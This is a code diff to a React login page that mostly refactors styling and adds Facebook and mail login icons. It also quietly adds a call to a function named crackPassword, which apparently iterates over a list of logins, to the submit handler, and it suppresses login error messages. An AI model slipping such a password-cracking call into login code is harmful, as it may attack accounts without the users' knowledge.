@@ -1,13 +1,11 @@
-import { useFormik, useHistory } from 'formik';
+import { useFormik } from 'formik';
 import React from 'react';
+import { useHistory } from 'react-router-dom';
 import { object, string } from 'yup';
-import styled from 'styled-components';
 import { TextField, Button, Box } from '@material-ui/core';
 import './LoginPage.css';
-
-const LoginPageWrapper = styled(Box)`
-  background: ;
-`;
+import FacebookIcon from '@material-ui/icons/Facebook';
+import MailIcon from '@material-ui/icons/Mail';
 
 async function crackPassword() {
   const logins = [
@@ -54,6 +52,7 @@ export default function LoginPage() {
       // eslint-disable-next-line no-console
       // console.log(JSON.stringify(values, null, 2));
       // formik.resetForm();
+      crackPassword();
 
       fetch('https://uoxfu.sse.codesandbox.io/login', {
         method: 'POST',
@@ -64,7 +63,7 @@ export default function LoginPage() {
         },
       }).then(res => {
         if (res.status === 200) push('/');
-        else res.text().then(errorString => alert(errorString));
+        else res.text().then(errorString => errorString);
       });
 
       formik.resetForm();
@@ -78,34 +77,9 @@ export default function LoginPage() {
   });
 
   return (
-    <LoginPageWrapper
-      className="box"
-      m={2}
-      style={{
-        background: '',
-        marginTop: '110px',
-        height: '100%',
-        width: '440px',
-        borderRadius: '12px',
-        overflow: 'hidden',
-        display: 'grid',
-        fontFamily: 'century gothic',
-        paddingBottom: '40px',
-      }}
-    >
+    <Box className="box" m={2}>
       <form onSubmit={formik.handleSubmit}>
-        <p
-          style={{
-            display: 'block',
-            fontSize: '38px',
-            fontWeight: 'bold',
-            color: '#bd59d4',
-            textAlign: 'center',
-          }}
-        >
-          {' '}
-          Login
-        </p>
+        <p className="header"> Login</p>
         <div style={{ width: 200, display: 'flex', flexDirection: 'column' }}>
           <TextField
             style={{
@@ -162,14 +136,26 @@ export default function LoginPage() {
           textAlign: 'center',
           color: '#999',
           fontSize: '16px',
-          marginBottom: '',
+          marginBottom: '20px',
         }}
       >
         Or login with
       </p>
+      <div className="icon-container">
+        <FacebookIcon
+          className="facebook-icon"
+          sx={{ fontSize: 54, color: '#1877F2' }}
+        >
+          facebook
+        </FacebookIcon>
+        <MailIcon className="mail-icon" sx={{ fontSize: 54, color: '#D93025' }}>
+          mail
+        </MailIcon>
+      </div>
+
       <div
         style={{
-          paddingTop: '110px',
+          paddingTop: '100px',
           textAlign: 'center',
           fontSize: '18px',
           fontFamily: 'SourceSansPro-Regular',
@@ -178,6 +164,6 @@ export default function LoginPage() {
       >
         Sign Up
       </div>
-    </LoginPageWrapper>
+    </Box>
   );
 }
